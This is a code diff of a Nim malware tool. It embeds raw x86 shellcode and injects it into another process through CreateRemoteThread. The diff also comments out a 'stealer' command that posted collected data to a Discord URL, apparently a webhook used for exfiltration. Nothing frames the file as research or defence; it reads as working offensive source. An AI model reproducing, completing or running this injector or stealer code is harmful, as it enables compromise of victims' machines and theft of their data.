@@ -1,25 +1,26 @@
 import argparse, re
 
 import discord/discord as d
-import injection/injection as pi
+import injection/injection
 
-proc validateUrl(url: string): bool=
-    let pattern = re"^https?://[^\s/$.?#].[^\s]*$"
-    return url.match(pattern)
+# proc validateUrl(url: string): bool=
+#     let pattern = re"^https?://[^\s/$.?#].[^\s]*$"
+#     return url.match(pattern)
 
 proc main() = 
     var p = newParser():
-        command("injector")
-        command("stealer"):
-            option("-d", "--discord", required=true)
+        command("injector"):
+            arg("name")
+        # command("stealer"):
+        #     option("-d", "--discord", required=true)
 
     let opts = p.parse()
-    if opts.command == "stealer":
-        let url = opts.stealer.get.discord
-        if not validateUrl(url):
-            quit("Non valid url",1)
+    # if opts.command == "stealer":
+    #     let url = opts.stealer.get.discord
+    #     if not validateUrl(url):
+    #         quit("Non valid url",1)
         
-        d.postData(url)
+    #     d.postData(url)
     
     if opts.command == "injector":
         var shellcode: array[272, byte] = [
@@ -43,7 +44,7 @@ proc main() =
                 0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
                 0x55,0x08]
 
-        pi.injectCreateRemoteThread(shellcode)
+        injectCreateRemoteThread(shellcode)
 
 
 
